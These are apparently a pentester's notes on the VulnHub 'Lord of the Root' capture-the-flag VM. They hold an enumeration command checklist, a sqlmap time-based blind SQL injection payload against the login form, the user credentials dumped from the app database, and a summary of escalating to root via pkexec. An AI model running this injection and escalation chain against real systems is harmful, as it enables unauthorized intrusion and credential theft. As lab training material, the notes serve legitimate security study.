BOX NAME: lordoftheroot
LINK: https://www.vulnhub.com/entry/lord-of-the-root-101,129/

IP=192.168.0.174
URL=http://192.168.0.174

# Credentials:

\[+\] gimli:AndMyAxe
\[+\] legolas:AndMyBow
\[+\] aragorn:AndMySword
\[+\] frodo:iwilltakethering
\[+\] smeagol:MyPreciousR00t (SSH)

# Hashes:

\[+\]

# Remote Enumeration:

Host Discovery

Nmap scan

# Hosts and computers:

\[+\] HOSTS:
\[+\] FQDN:
\[+\] COMPUTER NAME:
\[+\] OS:

# Look at.

\[+\]

# Special searchsploit findings:

\[+\] Port 21 \[FTP\]
\[+\] Port 22 \[SSH\]
\[+\] Port 23 \[TELNET\]
\[+\] Port 25 \[SMTP\]
\[+\] Port 53 \[DNS\]
\[+\] Port 80 \[HTTP\]
\[+\] Port 88 \[Kerberos\]
\[+\] Port 110 \[POP3\]
\[+\] Port 111 \[NFS\]
\[+\] Port 137 \[NETBIOS\]
\[+\] Port 139 \[NETBIOS\]
\[+\] Port 143 \[IMAP\]
\[+\] Port 443 \[HTTPS\]
\[+\] Port 445 \[SAMBA\]
\[+\] Port 464 \[Kerberos\]
\[+\] Port 465 \[SMTP\]
\[+\] Port 631 \[CUPS\]
\[+\] Port 587 \[SMTP /SSL\]
\[+\] Port 993 \[IMAP /SSL\]
\[+\] Port 995 \[POP3 /SSL\]
\[+\] Port 1194 \[OPENVPN\]
\[+\] Port 2049 \[NFS\]
\[+\] Port 3306 \[MySQL\]
\[+\] Port 5432 \[PostgreSQL\]
\[+\] Port 5900 \[VNC\]
\[+\] Port 5901 \[VNC\]
\[+\] Port 6001 \[X-SERVER\]
\[+\] Port 6667 \[IRC\]
\[+\] Port 6668 \[IRC\]
\[+\] Port 6669 \[IRC\]
\[+\] Port 6881 \[TORRENT\]
\[+\] Port 8080 \[HTTP\]

# FTP:

\[+\] ftp anonyomus@$IP

# SMB:

\[+\] smbclient -L $IP

# NFS:

\[+\] showmount -e $IP
\[+\] mount -t nfs $IP:/remote/folder local/folder

# SMTP:

\[+\] smtp-user-enum -U users.txt -t $IP

# HTTP/HTTPS:

\[+\] feroxbuster -u $IP -d 1

\[+\] gobuster dir http://$IP [+] gobuster vhost http://$IP

\[+\] Nikto --url http://$IP -C all

\[+\] ffuf -u '$URL/FUZZ' -w wordlist.txt -fs filtersize

# enum4linux:

\[+\] enum4linux -A $IP

# CMS:

\[+\] cmseek -u http://$IP --random-agent

\[+\] wpscan -u $IP

\[+\] droopescan -u $IP

\[+\] joomscan -u $IP -ec

# Local Filesystem Findings:

\[+\] FILES OF INTEREST

\[+\] SUID

```
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/bin/ping6
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/lppasswd
/usr/bin/traceroute6.iputils
/usr/bin/mtr
/usr/bin/sudo
/usr/bin/X
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
/usr/sbin/uuidd
/usr/sbin/pppd
```

\[+\] SGID

\[+\] Dumps, outputs, other useful information

```
└─# ssh root@$IP

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
root@192.168.0.174's password: 

```

```
└─# hURL -b "THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh"
Original string       :: THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh   
base64 DEcoded string :: Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
```

```
└─# hURL -b Lzk3ODM0NTIxMC9pbmRleC5waHA=        
Original string       :: Lzk3ODM0NTIxMC9pbmRleC5waHA=                       
base64 DEcoded string :: /978345210/index.php
```

```
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=pwn' AND (SELECT 6332 FROM (SELECT(SLEEP(5)))hZoQ)-- jltt&password=pwn&submit= Login
---

```

```
+----------+------------------+
| username | password         |
+----------+------------------+
| gimli    | AndMyAxe         |
| legolas  | AndMyBow         |
| aragorn  | AndMySword       |
| frodo    | iwilltakethering |
| smeagol  | MyPreciousR00t   |
+----------+------------------+
```

# Kernel Info:

\[+\] file /bin/bash

\[+\] lsb_release -a

\[+\] uname -a

# Exploits and Payloads:

\[+\] Only port 22 (SSH) open. Check it. Inidicates a portknocking operation. 1,2,3. Opens port 1337, Webserver (HTTP) Apache.
\[+\] Login page. Bypass with mysql. Grab all the credentials from Webapp database. Try it on SSH.
\[+\] Logged in to SSH. Realized pkexec was present. Root the box. badabing.

# Writeup:

==DIARY==

```
Started with ...
```

==PROOF==

```
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
```